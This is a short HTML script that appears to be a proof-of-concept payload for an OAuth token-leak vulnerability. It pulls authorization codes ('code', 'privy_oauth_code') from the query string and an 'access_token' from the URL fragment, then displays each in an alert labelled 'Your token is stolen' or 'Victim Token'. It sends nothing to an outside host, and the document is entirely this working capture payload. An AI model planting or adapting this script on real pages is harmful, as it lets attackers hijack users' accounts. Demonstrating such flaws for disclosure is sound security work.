<script>
    try {
        // Extract URL parameters
        var urlParams = new URLSearchParams(window.location.search);
        var codeValue = urlParams.get('code');
        var codeValue2 = urlParams.get('privy_oauth_code');

        // Check and alert if code values exist
        if (codeValue) {
            alert('Your token is stolen: ' + codeValue);
        }
        if (codeValue2) {
            alert('Your token is stolen: ' + codeValue2);
        }

        // Extract fragment parameters (after #)
        var urlp = {};
        var s = location.toString().split('#')[1];

        if (s) {
            s = s.split('&');
            for (var i = 0; i < s.length; i++) {
                var u = s[i].split('=');
                urlp[u[0]] = u[1];
            }

            // Check and alert if access_token exists
            if (urlp['access_token']) {
                alert('Victim Token: ' + urlp['access_token']);
            }
        }
    } catch (error) {
        console.error('An error occurred: ', error);
    }
</script>
